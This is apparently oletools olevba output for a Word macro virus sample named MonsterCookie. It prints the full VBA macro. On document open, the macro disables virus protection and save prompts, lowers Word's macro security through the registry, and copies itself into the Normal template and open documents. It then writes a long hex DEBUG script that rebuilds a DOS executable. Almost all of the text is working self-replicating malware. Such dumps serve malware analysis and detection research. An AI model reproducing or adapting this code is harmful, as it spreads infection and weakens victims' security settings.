olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.MonsterCookie.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.MonsterCookie.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO cookiemonster.cls 
in file: Virus.MSWord.MonsterCookie.a - OLE stream: 'Macros/VBA/cookiemonster'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'cookiemonster
Private Sub Document_Open() '(c)Necronomikon[Zer0Gravity]
On Error Resume Next: nec = Application.Version
Dim cookie As String
Application.DisplayStatusBar = (3 * 0)
Options.VirusProtection = (3 * 0)
Options.SaveNormalPrompt = (3 * 0)
System.PrivateProfileString("", "HKCU\Software\Microsoft\Office\& nec &\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKCU\Software\Microsoft\Office\& nec &\Word\Security", "AccessVBOM") = 1&
cookiemonster = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 328)
Set nec = NormalTemplate.VBProject.VBComponents(1).CodeModule
If ThisDocument = NormalTemplate Then _
 Set nec = ActiveDocument.VBProject.VBComponents(1).CodeModule
With nec
 If .Lines(1, 1) <> "'cookiemonster" Then
     .DeleteLines 1, .CountOfLines
     .InsertLines 1, cookiemonster
     If ThisDocument = NormalTemplate Then _
      ActiveDocument.SaveAs ActiveDocument.FullName
 End If
End With
cookie = InputBox("Give me a cookie:")
frmcookiemonster.Show
If cookie = "cookie" Then
GoTo good
End If
If cookie = "" Then
GoTo bye
End If
good:
MsgBox "yum,yum...", vbInformation, "Cookiemonster"
bye:
Open "c:\cookie" For Output As #1
Print #1, "e 0100  4D 5A DA 01 09 00 01 00 20 00 FE 00 FF FF 00 00"
Print #1, "e 0110  00 00 00 00 00 01 00 00 22 00 00 00 01 00 FB 10"
Print #1, "e 0120  72 6A 15 03 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0130  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0140  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0150  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0160  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0170  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0180  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0190  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 01A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 01B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 01C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 01D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 01E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 01F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0200  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0210  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0220  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0230  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0240  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0250  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0260  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0270  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0280  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0290  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 02A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 02B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 02C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 02D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 02E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 02F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0300  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0310  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0320  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0330  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0340  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0350  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0360  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0370  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0380  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0390  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 03A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 03B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 03C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 03D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 03E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 03F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0400  8C CA 2E 89 16 50 02 B4 30 CD 21 8B 2E 02 00 8B"
Print #1, "e 0410  1E 2C 00 8E DA A3 8D 0A 8C 06 8B 0A 89 1E 87 0A"
Print #1, "e 0420  89 2E 9F 0A C7 06 91 0A FF FF 8E C3 33 C0 B9 FF"
Print #1, "e 0430  7F 8B F8 8B D8 26 81 3D 38 37 75 1D 57 51 50 B0"
Print #1, "e 0440  3D F2 AE E3 11 26 8A 05 24 DF FF 06 91 0A 3C 59"
Print #1, "e 0450  75 04 FF 06 91 0A 58 59 5F F2 AE E3 63 43 26 38"
Print #1, "e 0460  05 75 D2 80 CD 80 F7 D9 89 0E 85 0A 83 C3 07 81"
Print #1, "e 0470  E3 FC FF D1 E3 89 1E 89 0A 1E B8 00 35 CD 21 89"
Print #1, "e 0480  1E 7B 0A 8C 06 7D 0A B8 00 25 0E 1F BA 44 02 CD"
Print #1, "e 0490  21 1F 0E FF 16 D6 0F 8B 3E D4 0F BB 00 01 3B FB"
Print #1, "e 04A0  77 02 8B FB 8C DA 81 C3 AC 1F 72 14 BF 00 10 B1"
Print #1, "e 04B0  04 D3 EB 43 2B EA 3B EF 77 09 87 DF 3B EF 77 03"
Print #1, "e 04C0  EB 71 90 8B DF 03 DA 89 1E 97 0A 89 1E 9B 0A A1"
Print #1, "e 04D0  8B 0A 2B D8 8E C0 B4 4A CD 21 D3 E7 8E D2 8B E7"
Print #1, "e 04E0  E8 EE 06 E8 78 00 33 C0 2E 8E 06 50 02 BF DA 0F"
Print #1, "e 04F0  B9 AC 1F 2B CF F3 AA FF 36 83 0A FF 36 81 0A FF"
Print #1, "e 0500  36 7F 0A E8 59 00 50 E8 48 00 B8 00 25 C5 16 7B"
Print #1, "e 0510  0A CD 21 2E 8E 1E 50 02 0E FF 16 D8 0F 8B EC 8A"
Print #1, "e 0520  46 02 B4 4C CD 21 B4 40 BB 02 00 2E 8E 1E 50 02"
Print #1, "e 0530  CD 21 C3 B9 1E 00 90 BA 5D 0A E8 E9 FF B8 03 00"
Print #1, "e 0540  50 E8 C6 FF B9 0E 00 90 BA 4F 0A E8 D8 FF EB ED"
Print #1, "e 0550  00 00 55 8B EC FF 76 04 E8 AF FF 59 5D C3 C3 55"
Print #1, "e 0560  8B EC 33 C0 50 B8 BE 0D 50 B8 09 00 50 E8 D1 04"
Print #1, "e 0570  8B E5 33 C0 50 B8 D0 0D 50 B8 09 00 50 E8 C1 04"
Print #1, "e 0580  8B E5 33 C0 50 B8 F7 0D 50 B8 09 00 50 E8 B1 04"
Print #1, "e 0590  8B E5 E8 C9 04 A3 DC 0F 25 30 00 3D 30 00 75 0E"
Print #1, "e 05A0  C7 06 09 10 00 B0 C7 06 07 10 00 00 EB 0C C7 06"
Print #1, "e 05B0  09 10 00 B8 C7 06 07 10 00 00 8B 5E 06 83 7F 02"
Print #1, "e 05C0  00 74 3F 8B 5E 06 FF 77 02 E8 69 04 59 A3 DA 0F"
Print #1, "e 05D0  3D 09 00 7E 0D 3D E9 03 7D 08 A3 A6 0A A3 A8 0A"
Print #1, "e 05E0  EB 20 33 C0 50 B8 10 0E 50 B8 09 00 50 E8 51 04"
Print #1, "e 05F0  8B E5 33 C0 50 B8 42 0E 50 B8 09 00 50 E8 41 04"
Print #1, "e 0600  8B E5 B8 09 00 50 E8 8C 04 59 89 16 05 10 A3 03"
Print #1, "e 0610  10 B8 5F 03 BA 00 00 52 50 B8 09 00 50 E8 85 04"
Print #1, "e 0620  8B E5 33 D2 B8 0D 00 52 50 52 52 8B C2 50 E8 33"
Print #1, "e 0630  04 83 C4 06 52 50 0E E8 CE 04 A3 A4 0A E8 0B 00"
Print #1, "e 0640  50 B0 00 50 E8 AE 04 8B E5 5D C3 A1 93 0A 05 0F"
Print #1, "e 0650  00 B9 04 00 D3 E8 8C DA 03 C2 2B 06 8B 0A C3 50"
Print #1, "e 0660  53 51 52 06 1E 56 57 55 2E 8E 1E 50 02 E4 60 A2"
Print #1, "e 0670  DE 0F 9C FF 1E 03 10 A1 A6 0A 99 52 50 33 C0 50"
Print #1, "e 0680  50 50 E8 DF 03 83 C4 06 52 50 0E E8 7A 04 0B D0"
Print #1, "e 0690  75 15 83 3E A2 0A 01 74 0E FF 06 A2 0A E8 24 02"
Print #1, "e 06A0  E8 0E 00 FF 0E A2 0A 5D 5F 5E 1F 07 5A 59 5B 58"
Print #1, "e 06B0  CF E8 7B 01 E8 AA 01 33 C0 50 B8 E1 0F 50 B8 DF"
Print #1, "e 06C0  0F 50 E8 2A 02 83 C4 06 33 C0 50 B8 24 00 50 B8"
Print #1, "e 06D0  04 00 50 E8 06 02 83 C4 06 33 C0 50 B8 0F 00 50"
Print #1, "e 06E0  B8 12 00 50 B8 E3 0F 50 E8 5A 02 83 C4 08 A1 A4"
Print #1, "e 06F0  0A BA 0F 00 F7 E2 05 AA 0A 50 B8 E3 0F 50 E8 B9"
Print #1, "e 0700  05 59 59 0B C0 74 71 33 D2 B8 05 00 52 50 52 52"
Print #1, "e 0710  8B C2 50 E8 4E 03 83 C4 06 52 50 0E E8 E9 03 A3"
Print #1, "e 0720  F3 0F 33 C0 50 A1 F3 0F BA 11 00 F7 E2 05 6D 0B"
Print #1, "e 0730  50 E8 CB 05 59 D1 E8 BA 28 00 2B D0 52 B8 06 00"
Print #1, "e 0740  50 E8 98 01 83 C4 06 33 C0 50 B8 0F 00 50 A1 F3"
Print #1, "e 0750  0F BA 11 00 F7 E2 05 6D 0B 50 E8 C3 01 83 C4 06"
Print #1, "e 0760  83 3E A6 0A 0A 7F 03 E9 88 00 A1 A6 0A BB 02 00"
Print #1, "e 0770  99 F7 FB A3 A6 0A EB 7A 33 D2 B8 05 00 52 50 52"
Print #1, "e 0780  52 8B C2 50 E8 DD 02 83 C4 06 52 50 0E E8 78 03"
Print #1, "e 0790  A3 F3 0F 33 C0 50 A1 F3 0F BA 11 00 F7 E2 05 C2"
Print #1, "e 07A0  0B 50 E8 5A 05 59 D1 E8 BA 28 00 2B D0 52 B8 06"
Print #1, "e 07B0  00 50 E8 27 01 83 C4 06 33 C0 50 B8 0F 00 50 A1"
Print #1, "e 07C0  F3 0F BA 11 00 F7 E2 05 C2 0B 50 E8 52 01 83 C4"
Print #1, "e 07D0  06 A1 A8 0A A3 A6 0A 33 D2 B8 0D 00 52 50 52 52"
Print #1, "e 07E0  8B C2 50 E8 7E 02 83 C4 06 52 50 0E E8 19 03 A3"
Print #1, "e 07F0  A4 0A C7 06 F3 0F 00 00 EB 04 FF 06 F3 0F 81 3E"
Print #1, "e 0800  F3 0F 00 7D 7C F4 C7 06 F3 0F 00 00 EB 04 FF 06"
Print #1, "e 0810  F3 0F 81 3E F3 0F 00 7D 7C F4 33 C0 50 FF 36 E1"
Print #1, "e 0820  0F FF 36 DF 0F E8 B4 00 83 C4 06 E8 1A 00 C3 B8"
Print #1, "e 0830  A0 0F 50 B8 0B 10 50 8C D8 50 33 C0 50 A1 09 10"
Print #1, "e 0840  50 E8 46 03 83 C4 0A C3 B8 A0 0F 50 33 C0 50 A1"
Print #1, "e 0850  09 10 50 B8 0B 10 50 8C D8 50 E8 2D 03 83 C4 0A"
Print #1, "e 0860  C3 C4 1E 07 10 81 C3 54 01 8C 06 FD 0F 89 1E FB"
Print #1, "e 0870  0F C7 06 F9 0F 17 0C C7 06 F5 0F 00 00 EB 3D C7"
Print #1, "e 0880  06 F7 0F 00 00 EB 25 8B 1E F9 0F 8A 07 C4 1E FB"
Print #1, "e 0890  0F 26 88 07 FF 06 FB 0F FF 06 F9 0F 8B 1E FB 0F"
Print #1, "e 08A0  26 C6 07 1E FF 06 FB 0F FF 06 F7 0F 83 3E F7 0F"
Print #1, "e 08B0  3C 7C D4 83 06 FB 0F 28 FF 06 F5 0F 83 3E F5 0F"
Print #1, "e 08C0  07 7C BC C3 33 C0 50 E8 AE 01 59 A3 FF 0F A9 FF"
Print #1, "e 08D0  00 74 05 25 FF 00 EB 03 A1 FF 0F C3 55 8B EC B8"
Print #1, "e 08E0  00 02 8A 56 06 8A 76 04 8A 7E 08 CD 10 5D C3 55"
Print #1, "e 08F0  8B EC B8 00 03 8A 7E 08 CD 10 8A C2 B4 00 8B 5E"
Print #1, "e 0900  06 89 07 8A C6 B4 00 8B 5E 04 89 07 5D C3 55 8B"
Print #1, "e 0910  EC B4 0E 8A 46 04 8A 5E 06 8A 7E 08 CD 10 5D C3"
Print #1, "e 0920  55 8B EC 8B 5E 04 FF 46 04 8A 07 A2 01 10 0A C0"
Print #1, "e 0930  74 11 FF 76 08 FF 76 06 FF 36 01 10 E8 CF FF 8B"
Print #1, "e 0940  E5 EB E0 5D C3 56 57 55 8B EC 8B 7E 0C 8B 76 08"
Print #1, "e 0950  33 C0 50 E8 22 01 59 A2 02 10 80 F8 0D 74 59 A0"
Print #1, "e 0960  02 10 B4 00 3D 08 00 74 07 3D 1B 00 74 E2 EB 34"
Print #1, "e 0970  83 3E BC 0D 00 7E D9 4E FF 0E BC 0D FF 76 0E 57"
Print #1, "e 0980  FF 36 02 10 E8 87 FF 8B E5 FF 76 0E 57 B0 20 50"
Print #1, "e 0990  E8 7B FF 8B E5 FF 76 0E 57 FF 36 02 10 E8 6E FF"
Print #1, "e 09A0  8B E5 EB AC A1 BC 0D 3B 46 0A 7D A4 A0 02 10 88"
Print #1, "e 09B0  04 46 FF 06 BC 0D EB DD C6 04 00 C7 06 BC 0D 00"
Print #1, "e 09C0  00 5D 5F 5E C3 56 57 55 8B EC 55 8B 76 08 FC 2B"
Print #1, "e 09D0  C0 99 B9 0A 00 B7 00 BF 77 0E 8A 1C 46 F6 01 01"
Print #1, "e 09E0  75 F8 BD 00 00 80 FB 2B 74 06 80 FB 2D 75 04 45"
Print #1, "e 09F0  8A 1C 46 80 FB 39 77 2E 80 EB 30 72 29 F7 E1 03"
Print #1, "e 0A00  C3 12 D6 74 EB EB 12 8B FA B9 0A 00 F7 E1 97 87"
Print #1, "e 0A10  D1 F7 E2 92 97 03 C3 13 D1 8A 1C 46 80 FB 39 77"
Print #1, "e 0A20  05 80 EB 30 73 E1 4D 7C 07 F7 DA F7 D8 83 DA 00"
Print #1, "e 0A30  5D 5D 5F 5E C3 55 8B EC FF 76 04 E8 87 FF 59 5D"
Print #1, "e 0A40  C3 56 57 55 8B EC 8A 66 08 8A 46 0C 8B 56 0A F8"
Print #1, "e 0A50  CD 21 72 02 EB 04 50 E8 5C 00 5D 5F 5E C3 CD 11"
Print #1, "e 0A60  C3 CD 12 C3 55 8B EC 8A 66 04 8B 4E 08 8B 56 06"
Print #1, "e 0A70  CD 1A 8B C2 8B D1 5D C3 55 8B EC 8A 66 04 CD 16"
Print #1, "e 0A80  75 0A 83 7E 04 01 75 04 33 C0 EB 00 5D C3 C7 06"
Print #1, "e 0A90  91 0A 00 00 CB 55 8B EC 8A 46 04 B4 35 CD 21 8B"
Print #1, "e 0AA0  C3 8C C2 5D C3 55 8B EC 1E C5 56 06 8A 46 04 B4"
Print #1, "e 0AB0  25 CD 21 1F 5D C3 56 57 55 8B EC 8B 76 08 0B F6"
Print #1, "e 0AC0  7C 11 83 FE 58 77 23 89 36 78 0F 8A 84 7A 0F 98"
Print #1, "e 0AD0  96 EB 0D F7 DE 83 FE 22 77 10 C7 06 78 0F FF FF"
Print #1, "e 0AE0  8B C6 A3 8F 0A B8 FF FF EB 05 BE 57 00 EB D8 5D"
Print #1, "e 0AF0  5F 5E C2 02 00 55 8B EC 8B 56 06 8A 46 04 B4 31"
Print #1, "e 0B00  CD 21 5D C3 B1 03 EB 0A B1 02 EB 06 B1 01 EB 02"
Print #1, "e 0B10  33 C9 55 56 57 8B EC 8B 46 0A 8B 56 0C 8B 5E 0E"
Print #1, "e 0B20  8B 6E 10 33 F6 F6 C1 01 75 1A 0B D2 79 09 F7 DA"
Print #1, "e 0B30  F7 D8 1B D6 80 C9 04 0B ED 79 09 F7 DD F7 DB 1B"
Print #1, "e 0B40  EE 80 F1 04 8B FD 0B FA 75 06 F7 F3 87 F2 EB 20"
Print #1, "e 0B50  51 B9 20 00 8B FE D1 E0 D1 D2 D1 D6 D1 D7 3B FD"
Print #1, "e 0B60  72 0B 77 04 3B F3 72 05 2B F3 1B FD 40 E2 E7 59"
Print #1, "e 0B70  F6 C1 02 74 03 96 8B D7 F6 C1 04 74 07 F7 DA F7"
Print #1, "e 0B80  D8 83 DA 00 5F 5E 5D CA 08 00 56 57 55 8B EC FC"
Print #1, "e 0B90  8B 4E 10 8B 7E 0E 8E 46 0C 8B 76 0A 1E 8E 5E 08"
Print #1, "e 0BA0  D1 E9 F3 A5 73 01 A4 1F 5D 5F 5E C3 55 8B EC FF"
Print #1, "e 0BB0  76 08 FF 76 06 8B 46 06 33 D2 52 FF 76 04 8B 46"
Print #1, "e 0BC0  04 33 D2 52 E8 C3 FF 8B E5 5D C3 00 00 00 00 00"
Print #1, "e 0BD0  00 2E 8F 06 CB 08 2E 8C 1E CD 08 FC 8E 06 8B 0A"
Print #1, "e 0BE0  BE 80 00 33 C0 8B D8 8B D0 8B C8 26 AC 8B FE 93"
Print #1, "e 0BF0  26 88 01 43 87 D9 E8 15 00 77 07 72 3F E8 0E 00"
Print #1, "e 0C00  77 F9 3C 20 74 04 3C 09 75 EC 32 C0 EB E8 0B C0"
Print #1, "e 0C10  74 07 42 AA 0A C0 75 01 43 86 E0 32 C0 F9 E3 18"
Print #1, "e 0C20  26 AC 49 2C 22 74 11 04 22 3C 5C 75 09 26 80 3C"
Print #1, "e 0C30  22 75 03 26 AC 49 0B F6 C3 E9 F7 F8 8C C5 8B 36"
Print #1, "e 0C40  85 0A 83 C6 02 B9 01 00 80 3E 8D 0A 03 72 0F 8E"
Print #1, "e 0C50  06 87 0A 8B FE B1 7F F2 AE E3 DE 80 F1 7F 43 89"
Print #1, "e 0C60  1E 7F 0A 43 8B C1 03 C2 03 DB 05 01 00 25 FE FF"
Print #1, "e 0C70  03 D8 8B FC 2B F8 2B E3 87 DD 8B EC 89 26 81 0A"
Print #1, "e 0C80  8C D0 8E C0 89 7E 00 83 C5 02 8E 1E 87 0A 49 F3"
Print #1, "e 0C90  A4 32 C0 AA 8E DB 87 CA BE 81 00 E3 0E 89 7E 00"
Print #1, "e 0CA0  83 C5 02 AC 0A C0 AA E0 FA 74 F0 33 C0 89 46 00"
Print #1, "e 0CB0  2E 8E 1E CD 08 2E FF 26 CB 08 56 57 55 8B EC 8B"
Print #1, "e 0CC0  76 08 8B 7E 0A 8C D8 8E C0 FC AC 0A C0 74 27 AE"
Print #1, "e 0CD0  74 F8 26 8A 65 FF 3C 61 72 06 3C 7A 77 02 2C 20"
Print #1, "e 0CE0  80 FC 61 72 08 80 FC 7A 77 03 80 EC 20 3A C4 74"
Print #1, "e 0CF0  D9 2A C4 98 EB 05 26 8A 25 EB F6 5D 5F 5E C3 56"
Print #1, "e 0D00  57 55 8B EC 8B 7E 08 8C D8 8E C0 B0 00 B9 FF FF"
Print #1, "e 0D10  FC F2 AE 8B C1 F7 D0 48 5D 5F 5E C3 00 00 00 00"
Print #1, "e 0D20  00 00 00 00 54 75 72 62 6F 2D 43 20 2D 20 43 6F"
Print #1, "e 0D30  70 79 72 69 67 68 74 20 28 63 29 20 31 39 38 37"
Print #1, "e 0D40  20 42 6F 72 6C 61 6E 64 20 49 6E 74 6C 2E 00 44"
Print #1, "e 0D50  69 76 69 64 65 20 65 72 72 6F 72 0D 0A 41 62 6E"
Print #1, "e 0D60  6F 72 6D 61 6C 20 70 72 6F 67 72 61 6D 20 74 65"
Print #1, "e 0D70  72 6D 69 6E 61 74 69 6F 6E 0D 0A 00 00 00 00 00"
Print #1, "e 0D80  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0D90  00 00 00 AC 1F 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0DA0  00 00 00 00 00 00 E8 03 E8 03 63 68 6F 63 6F 6C"
Print #1, "e 0DB0  61 74 65 20 63 68 69 70 00 6F 72 65 6F 00 00 00"
Print #1, "e 0DC0  00 00 00 00 00 00 00 00 6D 61 63 61 72 6F 6F 6E"
Print #1, "e 0DD0  00 00 00 00 00 00 00 6F 61 74 6D 65 61 6C 00 00"
Print #1, "e 0DE0  00 00 00 00 00 00 70 65 61 6E 75 74 20 62 75 74"
Print #1, "e 0DF0  74 65 72 00 00 66 69 67 20 6E 65 77 74 6F 6E 00"
Print #1, "e 0E00  00 00 00 00 6C 61 64 79 20 66 69 6E 67 65 72 73"
Print #1, "e 0E10  00 00 00 73 75 67 61 72 00 00 00 00 00 00 00 00"
Print #1, "e 0E20  00 00 76 61 6E 69 6C 6C 61 20 77 61 66 65 72 73"
Print #1, "e 0E30  00 70 65 63 61 6E 20 73 61 6E 64 69 65 73 00 00"
Print #1, "e 0E40  63 68 69 70 73 20 61 68 6F 79 00 00 00 00 00 67"
Print #1, "e 0E50  69 6E 67 65 72 20 73 6E 61 70 73 00 00 00 67 69"
Print #1, "e 0E60  72 6C 20 73 63 6F 75 74 00 00 00 00 00 42 6C 65"
Print #1, "e 0E70  63 68 21 21 21 00 00 00 00 00 00 00 00 00 4D 65"
Print #1, "e 0E80  20 6E 6F 20 6C 69 6B 65 20 74 68 61 74 2E 00 59"
Print #1, "e 0E90  75 63 6B 21 21 21 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0EA0  55 67 68 2E 2E 2E 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 0EB0  00 41 72 67 68 68 68 21 21 00 00 00 00 00 00 00"
Print #1, "e 0EC0  00 00 4D 6D 6D 6D 2E 2E 2E 20 6D 65 20 6C 69 6B"
Print #1, "e 0ED0  65 21 00 59 75 6D 6D 6D 59 75 6D 6D 6D 00 00 00"
Print #1, "e 0EE0  00 00 00 00 4F 68 20 62 6F 79 2E 2E 2E 20 54 61"
Print #1, "e 0EF0  6E 6B 73 00 00 44 65 6C 69 63 69 6F 75 73 2E 2E"
Print #1, "e 0F00  2E 00 00 00 00 00 54 68 61 6E 6B 20 59 6F 75 00"
Print #1, "e 0F10  00 00 00 00 00 00 00 C9 CD CD CD CD CD CD CD CD"
Print #1, "e 0F20  CD CD CD CD CD CD CD CD 20 49 6E 66 6F 2D 54 65"
Print #1, "e 0F30  63 68 20 43 6F 6F 6B 69 65 20 4D 6F 6E 73 74 65"
Print #1, "e 0F40  72 20 CD CD CD CD CD CD CD CD CD CD CD CD CD CD"
Print #1, "e 0F50  CD CD BB BA 20 20 20 20 20 20 20 20 20 20 20 20"
Print #1, "e 0F60  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20"
Print #1, "e 0F70  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20"
Print #1, "e 0F80  20 20 20 20 20 20 20 20 20 20 20 20 20 20 BA BA"
Print #1, "e 0F90  20 20 20 20 20 20 20 20 20 47 69 6D 6D 65 20 61"
Print #1, "e 0FA0  20 63 6F 6F 6B 69 65 21 20 20 20 20 20 20 20 20"
Print #1, "e 0FB0  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20"
Print #1, "e 0FC0  20 20 20 20 20 20 20 20 20 20 BA BA 20 20 20 20"
Print #1, "e 0FD0  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20"
Print #1, "e 0FE0  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20"
Print #1, "e 0FF0  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20"
Print #1, "e 1000  20 20 20 20 20 20 BA BA 20 20 20 20 20 20 20 20"
Print #1, "e 1010  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20"
Print #1, "e 1020  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20"
Print #1, "e 1030  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20"
Print #1, "e 1040  20 20 BA BA 20 20 20 20 20 20 20 20 20 20 20 20"
Print #1, "e 1050  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20"
Print #1, "e 1060  20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20"
Print #1, "e 1070  20 20 20 20 20 20 20 20 20 20 20 20 20 20 BA C8"
Print #1, "e 1080  CD CD CD CD CD CD CD CD CD CD CD CD CD CD CD CD"
Print #1, "e 1090  CD CD CD CD CD CD CD CD CD CD CD CD CD CD CD CD"
Print #1, "e 10A0  CD CD CD CD CD CD CD CD CD CD CD CD CD CD CD CD"
Print #1, "e 10B0  CD CD CD CD CD CD CD CD CD CD BC 00 00 00 43 4F"
Print #1, "e 10C0  4F 4B 49 45 20 4D 4F 4E 53 54 45 52 0D 0A 24 00"
Print #1, "e 10D0  43 6F 70 79 72 69 67 68 74 20 28 63 29 20 31 39"
Print #1, "e 10E0  38 37 20 62 79 20 57 61 6C 6B 65 72 20 41 72 63"
Print #1, "e 10F0  68 65 72 0D 0A 24 00 49 6E 69 74 69 61 74 69 6E"
Print #1, "e 1100  67 20 6C 75 72 6B 20 6D 6F 64 65 2E 0D 0A 24 00"
Print #1, "e 1110  0D 0A 45 52 52 4F 52 20 2D 20 61 72 67 75 6D 65"
Print #1, "e 1120  6E 74 20 6D 75 73 74 20 62 65 20 62 65 74 77 65"
Print #1, "e 1130  65 6E 20 31 30 20 61 6E 64 20 31 30 30 30 0D 0A"
Print #1, "e 1140  24 00 0D 0A 43 6F 6E 74 69 6E 75 69 6E 67 20 69"
Print #1, "e 1150  6E 73 74 61 6C 6C 61 74 69 6F 6E 20 77 69 74 68"
Print #1, "e 1160  20 61 20 64 65 66 61 75 6C 74 20 6F 66 20 31 30"
Print #1, "e 1170  30 30 0D 0A 24 00 00 20 20 20 20 20 20 20 20 20"
Print #1, "e 1180  21 21 21 21 21 20 20 20 20 20 20 20 20 20 20 20"
Print #1, "e 1190  20 20 20 20 20 20 20 01 40 40 40 40 40 40 40 40"
Print #1, "e 11A0  40 40 40 40 40 40 40 02 02 02 02 02 02 02 02 02"
Print #1, "e 11B0  02 40 40 40 40 40 40 40 14 14 14 14 14 14 04 04"
Print #1, "e 11C0  04 04 04 04 04 04 04 04 04 04 04 04 04 04 04 04"
Print #1, "e 11D0  04 04 40 40 40 40 40 40 18 18 18 18 18 18 08 08"
Print #1, "e 11E0  08 08 08 08 08 08 08 08 08 08 08 08 08 08 08 08"
Print #1, "e 11F0  08 08 40 40 40 40 20 00 00 00 00 00 00 00 00 00"
Print #1, "e 1200  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 1210  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 1220  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 1230  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 1240  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 1250  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 1260  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #1, "e 1270  00 00 00 00 00 00 00 00 00 00 00 13 02 02 04 05"
Print #1, "e 1280  06 08 08 08 14 15 05 13 FF 16 05 16 02 FF FF FF"
Print #1, "e 1290  FF FF FF FF FF FF FF FF FF FF 05 05 FF FF FF FF"
Print #1, "e 12A0  FF FF FF FF FF FF FF FF FF FF FF FF 0F FF FF 02"
Print #1, "e 12B0  FF 0F FF FF FF FF 13 FF FF 02 02 05 0F 02 FF FF"
Print #1, "e 12C0  FF 13 FF FF FF FF FF FF FF FF FF FF FF FF FF FF"
Print #1, "e 12D0  FF 13 FF 00 00 10 8E 07 8E 07 00"
Print #1, "rcx"
